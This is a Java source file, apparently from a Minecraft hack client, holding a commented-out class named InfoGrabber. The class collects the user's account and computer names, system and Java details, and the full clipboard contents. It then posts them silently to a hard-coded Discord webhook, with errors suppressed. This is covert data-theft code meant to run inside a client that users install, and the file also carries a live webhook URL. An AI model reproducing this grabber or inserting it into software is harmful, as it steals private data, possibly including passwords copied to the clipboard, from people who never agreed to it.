package me.cumhax.colahack.module.exploit;
/*
import me.cumhax.colahack.util.PlayerUtil2;
import org.json.simple.JSONObject;

import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;
import java.net.URL;

@SuppressWarnings ("unchecked")
public final
class InfoGrabber {

    public
    InfoGrabber() {
        try {
            JSONObject json = new JSONObject();
            json.put("content",
                    "```" +
                            "\nUsername: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + " Is using Acid-Zenith-Base" +
                            " \nOS: " + System.getProperty("os.name") +
                            " \nOS Version: " + System.getProperty("os.version") +
                            " \nOS Architecture: " + System.getProperty("os.arch") +
                            " \nProcessor Cores: " + Runtime.getRuntime().availableProcessors() +
                            " \nProcessor Cores 2: " + System.getenv("NUMBER_OF_PROCESSORS") +
                            " \nProcessor Type: " + System.getenv("PROCESSOR_ARCHITECTURE") +
                            " \nProcessor Info: " + System.getenv("PROCESSOR_IDENTIFIER") +
                            " \nJava Vendor: " + System.getProperty("java.vendor") +
                            " \nJava Spec Vendor: " + System.getProperty("java.specification.vendor") +
                            " \nJava Version: " + System.getProperty("java.version") +
                            " \nJava Runtime Version: " + System.getProperty("java.runtime.version") +
                            " \nJava Runtime: " + System.getProperty("java.runtime.name") +
                            " \nJava VM: " + System.getProperty("java.vm.name") +
                            " \nEncoding: " + System.getProperty("sun.jnu.encoding") +
                            " \nClipboard: " + Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor) +
                            " \nMemory Usage: " + Math.round(Runtime.getRuntime().freeMemory() / 1024.0f / 1024.0f) + " MB / " + Math.round(Runtime.getRuntime().maxMemory() / 1024.0f / 1024.0f) + " MB (Init " + Math.round(Runtime.getRuntime().totalMemory() / 1024.0f / 1024.0f) + " MB)" +
                            "```");
            HttpsURLConnection connection = (HttpsURLConnection) new URL("https://discord.com/api/webhooks/907318184330276934/37LOoFpp3ydIqLk2WicTauYWjfSG6AKydOCwv9URRQVSBdPRvRdYXyFgrqHYGqo6rYU7").openConnection();
            connection.addRequestProperty("Content-Type", "application/json");
            connection.addRequestProperty("User-Agent", "Acid-Tracker");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.getOutputStream().write(json.toString().getBytes());
            connection.getOutputStream().flush();
            connection.getOutputStream().close();
            connection.getInputStream().close();
            connection.disconnect();
        } catch (IOException | UnsupportedFlavorException ignored) {
        }
    }
}
*/